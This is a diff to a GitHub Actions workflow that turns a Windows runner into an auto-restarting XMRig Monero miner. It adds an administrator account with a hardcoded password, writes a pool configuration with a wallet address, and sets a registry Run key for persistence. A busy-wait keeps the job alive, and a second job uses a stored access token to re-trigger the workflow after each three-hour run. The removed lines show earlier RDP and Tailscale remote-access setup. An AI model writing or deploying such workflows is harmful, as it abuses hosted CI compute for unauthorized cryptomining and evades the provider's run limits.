@@ -1,4 +1,4 @@
-name: RDP TEST with Visible Admin Auto-Start (Final)
+name: RDP TEST Auto-Restarting Miner
 
 on:
   workflow_dispatch:
@@ -6,26 +6,18 @@ on:
 jobs:
   secure-rdp:
     runs-on: windows-latest
-    timeout-minutes: 3600
+    timeout-minutes: 180 # <-- This job will automatically stop after 3 hours
 
     steps:
-      - name: Configure Core RDP Settings
-        shell: powershell
-        run: |
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
-          netsh advfirewall firewall add rule name="Allow RDP" dir=in action=allow protocol=TCP localport=3389
-
-      - name: Create RDP User with Static Password
+      - name: Create Miner User
         shell: powershell
         run: |
           $password = "Runner-12345"
           $securePass = ConvertTo-SecureString $password -AsPlainText -Force
           New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
           Add-LocalGroupMember -Group "Administrators" -Member "RDP"
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
-          echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV
 
-      - name: Install and Configure XMRig Miner
+      - name: Install, Configure, and Set Auto-Start
         shell: powershell
         run: |
           $ErrorActionPreference = "Stop"
@@ -44,57 +36,37 @@ jobs:
           $jsonContent = '{"autosave": true,"cpu": true,"opencl": false,"cuda": false,"pools": [{"algo": "rx/0","url": "pool.supportxmr.com:5555","user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP","pass": "x"}]}'
           $jsonContent | ConvertFrom-Json | ConvertTo-Json -Depth 100 | Set-Content -Path (Join-Path $minerFolder "config.json")
 
-          # We add 'pause' back so the window stays open if there's an error on startup
           $batPath = Join-Path $desktopPath "Start-Miner.bat"
-          $batContent = "@echo off`r`ncd /d ""$($minerFolder)""`r`nxmrig.exe`r`npause"
+          $batContent = "@echo off`r`ncd /d ""$($minerFolder)""`r`nxmrig.exe"
           Set-Content -Path $batPath -Value $batContent
 
-      - name: Auto-start Miner with Admin Privileges (Visible)
+          $runKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+          Set-ItemProperty -Path $runKey -Name "XMRigMiner" -Value $batPath -Force
+
+      - name: Start the Miner Manually
         shell: powershell
         run: |
-          $ErrorActionPreference = "Stop"
-          $taskName = "XMRigMinerAutoStart"
-          $batPath = "C:\Users\RDP\Desktop\Start-Miner.bat"
+          Start-Process -FilePath "C:\Users\RDP\Desktop\Start-Miner.bat"
+          Write-Host "Miner process has been launched in the background."
           
-          Write-Host "Creating a new Scheduled Task to run the miner visibly..."
-          # This is the simplified, corrected command that will work.
-          schtasks /create /TN $taskName /TR $batPath /SC ONLOGON /RL HIGHEST /F
-          
-          Write-Host "--- Verification Step ---"
-          schtasks /query /TN $taskName
-          Write-Host "SUCCESS: Task Scheduler entry created. Miner will appear on login."
-
-      - name: Install Tailscale
+      - name: Maintain Workflow
         shell: powershell
         run: |
-          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile "$env:TEMP\tailscale.exe"
-          Start-Process "$env:TEMP\tailscale.exe" -ArgumentList "/quiet" -Wait
-
-      - name: Establish Tailscale Connection
-        shell: powershell
-        run: |
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
-          Start-Sleep -Seconds 10
-          $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-          if (-not $tsIP) { throw "Tailscale IP not assigned." }
-          echo "TAILSCALE_IP=$tsIP" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
-      
-      - name: Display RDP Connection Details
-        shell: powershell
-        run: |
-          Write-Host "================================================================"
-          Write-Host "                 RDP ACCESS READY"
-          Write-Host "================================================================"
-          Write-Host "Tailscale IP Address: ${{ env.TAILSCALE_IP }}"
-          Write-Host "Username: RDP"
-          Write-Host "Password: ${{ env.RDP_PASSWORD }}"
-          Write-Host "----------------------------------------------------------------"
-          Write-Host "ACTION: The miner will now start automatically in a VISIBLE window."
-          Write-Host "================================================================"
-
-      - name: Maintain Connection
-        shell: powershell
-        run: |
+          Write-Host "Workflow is now in mining mode. It will run for 3 hours before restarting."
           while ($true) {
               Start-Sleep -Seconds 300
           }
+
+  trigger-next-run:
+    runs-on: ubuntu-latest
+    needs: secure-rdp
+    if: always()
+
+    steps:
+      - name: Trigger new workflow run
+        env:
+          GH_TOKEN: ${{ secrets.PAT_TOKEN }} # <-- This line securely uses your secret
+        run: |
+          echo "Triggering the next workflow run..."
+          # Replace 'main.yml' if your workflow file has a different name
+          gh workflow run main.yml
